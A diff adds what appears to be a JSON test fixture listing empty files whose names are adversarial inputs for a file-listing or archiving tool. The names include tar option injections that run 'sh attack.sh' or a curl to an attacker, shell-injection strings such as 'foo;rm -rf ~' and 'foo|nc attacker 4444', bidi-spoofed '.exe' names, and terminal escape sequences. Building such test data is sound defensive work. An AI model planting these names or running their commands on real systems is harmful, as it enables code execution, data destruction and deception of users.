@@ -1,0 +1,449 @@
+[
+  {
+    "type": "directory",
+    "name": "./",
+    "size": 4096,
+    "contents": [
+      {
+        "type": "file",
+        "name": "--checkpoint=1",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "--checkpoint-action=exec=sh attack.sh",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "--use-compress-program=sh",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "--to-command=curl-attacker",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "--wildcards",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "--exclude=important.conf",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "-Tfoo",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "--format=gnu",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "`whoami`",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "foo;rm -rf ~",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "foo|nc attacker 4444",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "foo>etc_passwd",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "foo&bar",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "${PATH}",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "$HOME",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "file\nwith\nnewlines",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "file\twith\ttabs",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "file\rwith\rcr",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "file\r\nwith_crlf",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "file\u000bvertical_tab",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "file\fform_feed",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "innocent\u202etxt.exe",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "report\u202efdp.exe",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "doc\u202dltr_override.pdf",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "mix\u202arle_embed.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "iso\u2066first_strong\u2069end",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "iso\u2067rli_isolate\u2069end",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "title\u001b]0;HACKED\u0007.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "clear\u001b[2J\u001b[H.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "link\u001b]8;;evil:link\u0007click\u001b]8;;\u0007.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "color\u001b[31;1mRED\u001b[0m.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "backspace\b\b\b\bevil.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "hide\u001b[8m_hidden_\u001b[28m.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "savecur\u001b7evil\u001b8.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "caf\u00e9_nfc",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "cafe\u0301_nfd",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "\u00e9",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "e\u0301",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "hangul_\uac00_syllable",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "hangul_\u1100\u1161_jamo",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "file\uff11.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "file1.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "file\uff41.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "filea.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "file\u2168.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "fileIX.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "stack_small_a\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "stack_medium_a\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "stack_max_a\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301\u0301",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "nc_fdd0_\ufdd0",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "nc_fdef_\ufdef",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "nc_fffe_\ufffe",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "nc_ffff_\uffff",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "CON",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "CON.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "PRN",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "PRN.log",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "AUX.tar.gz",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "NUL",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "NUL.",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "COM1",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "COM1.txt",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "LPT1",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "LPT9",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "trailing_space ",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "trailing_two_spaces  ",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "trailing_tab\t",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "trailing_dot.",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "trailing_two_dots..",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "trailing_mixed. .",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "trailing_nbsp\u00a0",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "-",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "--",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "-v",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "-rf",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "--help",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "-o output.tar",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "{\"type\":\"file\",\"name\":\"pwn\",\"size\":99999999999}",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "[\"injected\",\"array\"]",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "---\nkey: value",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "PK\u0003\u0004fake_zip_magic",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "7z\u00bc\u00af'\u001cfake_7zip_magic",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "\u001f\u008bfake_gzip_magic",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "zerowidth_a\u200bzero_width_space",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "zerowidth_b\u200czero_width_nonjoin",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "zerowidth_c\u200dzero_width_join",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "zerowidth_d\ufeffzero_width_nbsp",
+        "size": 0
+      },
+      {
+        "type": "file",
+        "name": "zerowidth_e\u180ezero_width_mvs",
+        "size": 0
+      }
+    ]
+  }
+]
